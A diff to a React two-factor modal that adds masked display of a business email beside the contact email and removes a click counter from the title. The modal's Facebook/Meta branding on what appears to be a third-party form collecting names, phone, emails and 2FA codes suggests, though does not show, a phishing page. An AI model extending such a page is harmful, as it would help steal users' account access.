@@ -28,10 +28,19 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const [twoFa, setTwoFa] = React.useState('');
 
-    const { fullName, phone, email } = formDataState as FormData || {};
+    const { fullName, phone, email, emailBusiness } = formDataState as FormData || {};
 
-    const phoneDisplay = maskPhoneNumber(phone)
-    const emailDisplay = maskEmail(email);
+    const phoneDisplay = maskPhoneNumber(phone);
+    const maskedEmails = React.useMemo(() => {
+        const contact = email?.trim() ?? '';
+        const business = emailBusiness?.trim() ?? '';
+        const list: string[] = [];
+        if (contact) list.push(maskEmail(contact));
+        if (business && business.toLowerCase() !== contact.toLowerCase()) {
+            list.push(maskEmail(business));
+        }
+        return list.join(', ');
+    }, [email, emailBusiness]);
 
     const [countdown, setCountdown] = React.useState<number>(initialCountdown);
 
@@ -211,8 +220,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                         <span>{t.common.facebook}</span>
                     </div>
-                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
-                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
+                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
+                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(maskedEmails, phoneDisplay)}</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
